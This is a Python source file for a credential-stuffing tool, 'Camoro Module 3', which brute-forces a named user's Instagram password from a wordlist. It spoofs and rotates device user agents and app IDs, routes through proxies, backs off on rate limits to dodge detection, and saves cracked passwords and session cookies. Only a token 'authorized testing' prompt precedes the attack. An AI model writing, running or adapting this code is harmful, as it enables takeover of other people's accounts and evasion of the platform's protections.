#!/usr/bin/env python3
"""Camoro Module 3 - Instagram Brute Force Engine (delays + device rotate)."""

from __future__ import annotations

import json
import os
import random
import re
import sys
import time
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

class C:
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    C = "\033[96m"
    W = "\033[97m"
    D = "\033[2m"
    BL = "\033[1m"
    RE = "\033[0m"

DEVICES: List[Dict[str, str]] = [
    {
        "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "app": "936619743392459",
        "name": "iPhone",
    },
    {
        "ua": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
        "app": "936619743392459",
        "name": "Pixel8",
    },
    {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "app": "936619743392459",
        "name": "Windows",
    },
    {
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "app": "936619743392459",
        "name": "Mac",
    },
    {
        "ua": "Instagram 312.0.0.0.47 Android (33/13; 420dpi; 1080x2400; Google; Pixel 7; panther; en_US)",
        "app": "567067343352427",
        "name": "IG-Android",
    },
    {
        "ua": "Instagram 311.0.0.0.109 (iPhone14,3; iOS 17_5; en_US; en; scale=3.00; 1170x2532)",
        "app": "124024574287414",
        "name": "IG-iOS",
    },
]

LOGIN_URLS = [
    "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
    "https://www.instagram.com/accounts/login/ajax/",
]


def clear() -> None:
    try:
        os.system("clear 2>/dev/null || true")
    except Exception:
        print("\n" * 3)


def pause() -> None:
    try:
        input(f"\n  {C.D}Enter...{C.RE}")
    except (EOFError, KeyboardInterrupt):
        pass


def ask(msg: str, default: str = "") -> str:
    try:
        v = input(f"  {C.G}[?]{C.RE} {msg} {C.D}[{default}]{C.RE} > ").strip()
    except (EOFError, KeyboardInterrupt):
        return default
    return v if v else default


def get_requests():
    try:
        from curl_cffi import requests as r  # type: ignore

        return r
    except Exception:
        import requests as r  # type: ignore

        return r


class BruteEngine:
    def __init__(
        self,
        username: str,
        wordlist_path: str,
        delay_min: float = 3.0,
        delay_max: float = 5.0,
        rotate_every: int = 20,
        proxy: Optional[str] = None,
    ) -> None:
        self.username = username.replace("@", "").strip()
        self.wordlist_path = wordlist_path
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.rotate_every = max(5, int(rotate_every))
        self.proxy = proxy

        self.req = get_requests()
        self.session: Any = None
        self.csrf: Optional[str] = None
        self.device: Dict[str, str] = DEVICES[0]
        self.device_idx = 0
        self.last_rotate = 0.0

        self.passwords: List[str] = []
        self.total = 0
        self.tested = 0
        self.found: Optional[str] = None
        self.start_time = 0.0

        self._load_wordlist()

    def _load_wordlist(self) -> None:
        with open(self.wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            self.passwords = [ln.strip() for ln in f if ln.strip()]
        self.total = len(self.passwords)

    def _new_session(self) -> bool:
        self.device = DEVICES[self.device_idx % len(DEVICES)]
        self.device_idx += 1
        try:
            self.session = self.req.Session()
            self.session.headers.update(
                {
                    "User-Agent": self.device["ua"],
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
                    "Origin": "https://www.instagram.com",
                    "Referer": "https://www.instagram.com/accounts/login/",
                    "X-Requested-With": "XMLHttpRequest",
                    "X-IG-App-ID": self.device["app"],
                    "X-IG-WWW-Claim": "0",
                }
            )
            if self.proxy:
                self.session.proxies = {"http": self.proxy, "https": self.proxy}

            r = self.session.get("https://www.instagram.com/accounts/login/", timeout=25)
            csrf = None
            try:
                csrf = self.session.cookies.get("csrftoken")
            except Exception:
                csrf = None
            if not csrf:
                m = re.search(r'"csrf_token"\s*:\s*"([^"]+)"', r.text or "")
                if m:
                    csrf = m.group(1)
            self.csrf = csrf
            if self.csrf:
                self.session.headers["X-CSRFToken"] = self.csrf
                self.session.headers["X-Instagram-AJAX"] = "1"
            self.last_rotate = time.time()
            return bool(self.csrf)
        except Exception as e:
            print(f"  {C.R}[!] Session/CSRF error: {e}{C.RE}")
            return False

    def _maybe_rotate(self) -> None:
        if time.time() - self.last_rotate >= self.rotate_every:
            print(f"\n  {C.Y}[↻] Rotating device...{C.RE}")
            ok = self._new_session()
            name = self.device.get("name", "?")
            csrf_s = (self.csrf or "")[:16]
            print(f"  {C.G}[✓] Device={name} CSRF={csrf_s}... ok={ok}{C.RE}")

    def _try_login(self, password: str) -> str:
        self._maybe_rotate()
        if self.session is None:
            if not self._new_session():
                return "error"

        url = random.choice(LOGIN_URLS)
        payload = {
            "username": self.username,
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
            "queryParams": "{}",
            "optIntoOneTap": "false",
            "trustedDeviceRecords": "{}",
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-CSRFToken": self.csrf or "",
            "Referer": "https://www.instagram.com/accounts/login/",
        }

        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=25)
        except Exception:
            return "error"

        try:
            if self.session.cookies.get("sessionid") or self.session.cookies.get("ds_user_id"):
                return "success"
        except Exception:
            pass

        data: Dict[str, Any] = {}
        try:
            data = r.json()
        except Exception:
            data = {}

        if data.get("authenticated") is True:
            return "success"
        if data.get("message") == "checkpoint_required" or "checkpoint_url" in data:
            return "checkpoint"
        if r.status_code == 429 or data.get("spam") is True or "Please wait" in (r.text or ""):
            return "rate_limit"
        if data.get("authenticated") is False or data.get("user") is False:
            return "fail"
        if r.status_code in (400, 401):
            return "fail"
        return "fail"

    def _progress(self, password: str, status: str) -> None:
        pct = (self.tested / self.total * 100.0) if self.total else 0.0
        elapsed = max(time.time() - self.start_time, 1.0)
        speed = self.tested / elapsed
        remain = max(self.total - self.tested, 0)
        eta = int(remain / speed) if speed > 0 else 0
        bar_len = 20
        filled = int(bar_len * self.tested / self.total) if self.total else 0
        bar = "█" * filled + "░" * (bar_len - filled)
        show = password if len(password) <= 16 else password[:13] + "..."
        line = (
            f"\r  {C.C}{bar}{C.RE} {C.W}{pct:5.1f}%{C.RE} | "
            f"{C.G}{self.tested}/{self.total}{C.RE} | {status:4} | "
            f"{C.W}{show:<16}{C.RE} | {C.D}{speed:.2f}/s ETA {eta}s{C.RE}   "
        )
        try:
            sys.stdout.write(line)
            sys.stdout.flush()
        except Exception:
            pass

    def start(self) -> Optional[str]:
        os.makedirs("output", exist_ok=True)
        print(
            f"""
  {C.R}{C.BL}╔══════════════════════════════════════════════════╗
  ║       CAMORO BRUTE FORCE ENGINE                  ║
  ╚══════════════════════════════════════════════════╝{C.RE}

  {C.G}[*]{C.RE} Target:     {C.BL}{self.username}{C.RE}
  {C.G}[*]{C.RE} Passwords:  {C.Y}{self.total}{C.RE}
  {C.G}[*]{C.RE} Delay:      {self.delay_min}-{self.delay_max}s
  {C.G}[*]{C.RE} Rotate:     every {self.rotate_every}s
  {C.G}[*]{C.RE} Wordlist:   {self.wordlist_path}
"""
        )

        print(f"  {C.C}[*] Initializing session...{C.RE}")
        if not self._new_session():
            print(f"  {C.R}[!] CSRF init failed. Use VPN/proxy.{C.RE}")
            return None

        print(f"  {C.G}[✓]{C.RE} CSRF: {C.Y}{str(self.csrf)[:20]}...{C.RE}")
        print(f"  {C.G}[✓]{C.RE} Device: {C.C}{self.device['name']}{C.RE}")
        print(f"  {C.Y}[!] Testing with {self.delay_min}-{self.delay_max}s delays{C.RE}\n")

        prog_path = f"output/{self.username}_progress.json"
        start_idx = 0
        if os.path.isfile(prog_path):
            try:
                with open(prog_path, encoding="utf-8") as f:
                    start_idx = int(json.load(f).get("tested", 0))
                self.tested = start_idx
                print(f"  {C.Y}[*] Resuming from #{start_idx}{C.RE}\n")
            except Exception:
                start_idx = 0

        self.start_time = time.time()

        try:
            for i, password in enumerate(self.passwords):
                if i < start_idx:
                    continue

                result = self._try_login(password)
                self.tested += 1

                if result == "success":
                    self.found = password
                    self._progress(password, f"{C.G}HIT{C.RE}")
                    print(f"\n\n  {C.G}{C.BL}{'=' * 40}{C.RE}")
                    print(f"  {C.G}{C.BL}  PASSWORD FOUND{C.RE}")
                    print(f"  {C.G}{C.BL}  User: {self.username}{C.RE}")
                    print(f"  {C.G}{C.BL}  Pass: {password}{C.RE}")
                    print(f"  {C.G}{C.BL}{'=' * 40}{C.RE}\n")
                    try:
                        cookies = {}
                        try:
                            cookies = {c.name: c.value for c in self.session.cookies}
                        except Exception:
                            pass
                        with open(f"output/{self.username}_CRACKED.txt", "w", encoding="utf-8") as f:
                            f.write(f"username: {self.username}\n")
                            f.write(f"password: {password}\n")
                            f.write(f"time: {datetime.now().isoformat()}\n")
                            f.write(f"cookies: {json.dumps(cookies)}\n")
                        print(f"  {C.G}[✓] Saved output/{self.username}_CRACKED.txt{C.RE}")
                    except Exception as e:
                        print(f"  {C.Y}[!] Save cracked failed: {e}{C.RE}")
                    return password

                if result == "checkpoint":
                    self._progress(password, f"{C.Y}CHK{C.RE}")
                    print(f"\n  {C.Y}[!] Checkpoint/2FA (password may be correct): {password}{C.RE}")
                    try:
                        with open(
                            f"output/{self.username}_checkpoint_hits.txt",
                            "a",
                            encoding="utf-8",
                        ) as f:
                            f.write(password + "\n")
                    except Exception:
                        pass
                    time.sleep(8)
                    self._new_session()
                elif result == "rate_limit":
                    self._progress(password, f"{C.R}RATE{C.RE}")
                    wait = random.randint(30, 90)
                    print(f"\n  {C.R}[!] Rate limited. Sleep {wait}s + rotate{C.RE}")
                    time.sleep(wait)
                    self._new_session()
                elif result == "error":
                    self._progress(password, f"{C.R}ERR{C.RE}")
                    time.sleep(5)
                    self._new_session()
                else:
                    self._progress(password, "pwd")

                if self.tested % 25 == 0:
                    try:
                        with open(prog_path, "w", encoding="utf-8") as f:
                            json.dump(
                                {
                                    "tested": self.tested,
                                    "total": self.total,
                                    "username": self.username,
                                    "time": datetime.now().isoformat(),
                                },
                                f,
                            )
                    except Exception:
                        pass

                time.sleep(random.uniform(self.delay_min, self.delay_max))

        except KeyboardInterrupt:
            print(f"\n\n  {C.Y}[!] Interrupted. Progress saved.{C.RE}")
            try:
                with open(prog_path, "w", encoding="utf-8") as f:
                    json.dump(
                        {
                            "tested": self.tested,
                            "total": self.total,
                            "username": self.username,
                        },
                        f,
                    )
            except Exception:
                pass
            return None

        print(f"\n\n  {C.R}[✗] Wordlist exhausted. Not found.{C.RE}")
        return None


def run() -> None:
    clear()
    print(
        f"""
  {C.R}{C.BL}╔══════════════════════════════════════════════════╗
  ║       CAMORO BRUTE FORCE ENGINE                  ║
  ╚══════════════════════════════════════════════════╝{C.RE}
"""
    )

    username = ask("Target username").replace("@", "")
    if not username:
        print(f"  {C.R}[!] Username required{C.RE}")
        pause()
        return

    default_wl = f"wordlists/{username}_wordlist.txt"
    if not os.path.isfile(default_wl):
        default_wl = f"output/{username}_wordlist.txt"
    if not os.path.isfile(default_wl):
        default_wl = ""

    wl = ask("Wordlist path", default_wl)
    if not wl or not os.path.isfile(wl):
        print(f"  {C.R}[!] Wordlist not found. Run module [2] first.{C.RE}")
        pause()
        return

    delay = ask("Delay min-max seconds", "3-5")
    try:
        parts = delay.split("-")
        dmin = float(parts[0])
        dmax = float(parts[1]) if len(parts) > 1 else dmin
        if dmin < 0:
            dmin = 0
        if dmax < dmin:
            dmax = dmin
    except Exception:
        dmin, dmax = 3.0, 5.0

    rotate_s = ask("Device rotate every seconds", "20")
    try:
        rotate = int(rotate_s)
    except Exception:
        rotate = 20

    proxy = ask("Proxy http://ip:port (optional)", "") or None

    print(
        f"""
  {C.Y}[!] Authorization confirmation{C.RE}
  {C.W}You confirm authorized testing of this account only.{C.RE}
"""
    )
    conf = ask("Start attack? Y/N", "N").lower()
    if conf not in ("y", "yes", "نعم"):
        print(f"  {C.Y}[*] Cancelled{C.RE}")
        pause()
        return

    try:
        engine = BruteEngine(
            username=username,
            wordlist_path=wl,
            delay_min=dmin,
            delay_max=dmax,
            rotate_every=rotate,
            proxy=proxy,
        )
    except Exception as e:
        print(f"  {C.R}[✗] Init failed: {e}{C.RE}")
        pause()
        return

    if engine.total <= 0:
        print(f"  {C.R}[!] Empty wordlist{C.RE}")
        pause()
        return

    try:
        engine.start()
    except Exception as e:
        print(f"\n  {C.R}[✗] Engine error: {e}{C.RE}")
        import traceback

        traceback.print_exc()

    pause()


if __name__ == "__main__":
    run()
